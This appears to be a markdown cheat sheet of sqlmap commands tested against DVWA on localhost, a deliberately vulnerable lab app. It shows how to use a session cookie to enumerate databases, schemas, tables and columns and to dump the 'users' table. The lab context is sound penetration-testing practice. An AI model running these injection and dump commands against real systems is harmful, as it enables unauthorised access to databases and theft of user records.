# SQL MAP (tested on dvwa)
## Read Manual of [sqlmap](../manual/sqlmap.txt)
### 1 . using ```--cookie``` & ```--tables```
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="PHPSESSID=17258d812ca21d6e07229084050be915;security=low" --tables 
```
### 2.using ``` --schema``` & ```--batch```
- batch will select default option

``` bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="PHPSESSID=17258d812ca21d6e07229084050be915;security=low" --schema --batch
```

### 3.using ```--columns ``` & ```--batch```
- we will numerate a certain columns

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="PHPSESSID=17258d812ca21d6e07229084050be915;security=low" --columns -T users --batch
```
### 4.Dump data using ```--dump``` 
- let's dump the data table
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="PHPSESSID=17258d812ca21d6e07229084050be915;security=low" --dump -T users --batch
```

### 5. using ```--dbs```
``` bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="PHPSESSID=17258d812ca21d6e07229084050be915;security=low" --dbs --batch 
```

### 6.using -D
- we can look tables of a specific database
```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="PHPSESSID=17258d812ca21d6e07229084050be915;security=low" --tables -D dvwa
```